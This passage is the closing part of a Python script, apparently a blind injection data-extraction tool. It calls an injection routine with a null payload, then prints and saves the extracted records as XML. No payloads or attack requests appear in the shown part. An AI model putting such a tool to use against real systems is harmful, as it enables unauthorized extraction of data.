        )
        xml_str = build_xml(data, field_name) if data else None
    else:
        data    = run_predicate(engine, inj_param, extractor, null_pay,
                                args.predicate_step, args.max_records)
        xml_str = None

    # ── Output ────────────────────────────────────────────────────────────────
    print_summary(data, xml_str if not args.xml else None)

    if args.xml and xml_str:
        with open(args.xml, "w") as fh:
            fh.write(xml_str)
        success(f"XML saved to: {args.xml}")
    elif args.xml and not xml_str:
        warn("No data extracted — XML file not saved.")


if __name__ == "__main__":
    main()
